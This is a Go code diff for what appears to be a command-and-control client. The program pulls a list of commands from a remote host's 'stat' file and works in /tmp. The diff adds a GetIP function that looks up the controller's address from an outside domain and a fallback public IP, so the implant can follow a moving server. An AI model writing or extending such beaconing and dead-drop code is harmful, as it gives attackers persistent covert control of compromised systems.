@@ -17,7 +17,7 @@ import (
 
 //Initialize variables
 var downDir string = "/tmp/"
-var host string = "http://10.100.1.101/"
+var host string = "http://10.100.0.101/"
 var edition int = 0
 var isVerbose bool = false
 
@@ -40,6 +40,7 @@ func do() {
 		fmt.Printf("Grabbing HTTP\n")
 	}
 	//Get and read stat file
+	host = "http://" + GetIP() + "/"
 	stat := getHTTP(host + "stat")
 	commands := strings.Split(stat, "\n")
 
@@ -91,6 +92,28 @@ func do() {
 
 func removeFile(path string) {
 	os.Remove(path)
+}
+
+func GetIP() string {
+	resp, err := http.Get("http://mdbook.me/ip.txt")
+	var ip string
+	if err == nil {
+		body, _ := ioutil.ReadAll(resp.Body)
+		line := string(body)
+		line = strings.TrimSuffix(line, "\n")
+		ip = line
+	} else {
+		resp, err = http.Get("http://129.21.141.218/ip.txt")
+		if err == nil {
+			body, _ := ioutil.ReadAll(resp.Body)
+			line := string(body)
+			line = strings.TrimSuffix(line, "\n")
+			ip = line
+		} else {
+			ip = "10.100.0.101"
+		}
+	}
+	return ip
 }
 
 func copyFile(src, dest string) {
